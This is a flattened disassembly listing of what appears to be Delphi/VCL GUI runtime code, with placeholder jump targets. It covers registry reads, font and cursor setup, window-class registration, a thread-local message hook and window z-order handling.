mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408d28
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_451d90
test al al
je r-xdata
xor eax eax
push ebp
push sub_464def
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404258
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404258
sub_464ea4
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_467704
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4674b8
mov dl 0x1
mov eax [ rw-data ]
call sub_4674b8
sub_464f10
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_464f38
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_464f10
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406c0c
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406b88
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_464fc8
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_46510d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4674b8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423ad4
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423ad4
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_423bb8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423ad4
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_423ad4
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423ad4
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_4674b8
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_423918
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_423918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465114
cmp [ rw-data ] 0x0
je r-xdata
sub_46514c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_4651ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_4652e8 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_46535c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_464ab4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_418550
mov dl [ ebp - 0x1 ]
call sub_4651ac
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_464aa0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4183f4
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_4185cc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_418550
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_46514c
test al al
je r-xdata
inc esi
sub_4654a8
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_464ab4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_464aa0
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_465500
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_4654a8
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46557a
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_46535c
pop ecx
push ebp
mov al 0x2
call sub_46535c
pop ecx
push ebp
mov al 0x3
call sub_46535c
pop ecx
push ebp
mov al 0x4
call sub_46535c
pop ecx
push ebp
mov al 0x5
call sub_46535c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403270
retn
sub_465588
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46511c
xor eax eax
push ebp
push sub_465601
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_465500
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_465124
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_46561c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403fe8
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_40403c
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_465674
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_403738#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_467ac0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4656c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_444fdc
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_467b3c
sub_465724
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_466bdc
sub_465768
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_465724
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_4656c8
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_4657dc
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_465838
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_465868
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_465890
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_465838
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_465868
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_465868
sub_4658d0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42086c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_466fa8
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_428b88
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_428f58
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_467740
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c3ec
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_4671a0
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c414
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4086f0
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404258
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_46791c
mov eax ebx
call sub_468330
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_465bd8
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_465ab9
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_468340
mov [ esp + 0x4 ] esi
mov [ esp ] sub_466fa8
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_4671a0
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_467b3c
xor edx edx
mov eax esi
call sub_4674b8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4208b8
push esi
push sub_46600c
mov eax esi
call sub_466d94
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4058a8
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403270
mov eax [ esi + 0x90 ]
call sub_403270
mov eax [ esi + 0x98 ]
call sub_403270
test bl bl
jle r-xdata
call sub_421994
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_465bd8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_465d79
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465d80
lea eax [ ebp - 0x2c ]
call sub_403fe8
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_466158
call sub_4218fc
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4044a8
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406c8c
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403fe8
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_46685c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46685c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_465d88
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_464abc
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_465de8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_4183f4
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_44d054
cmp ebx eax
je r-xdata
sub_465e58
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_465de8
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_418550
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_465f70
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
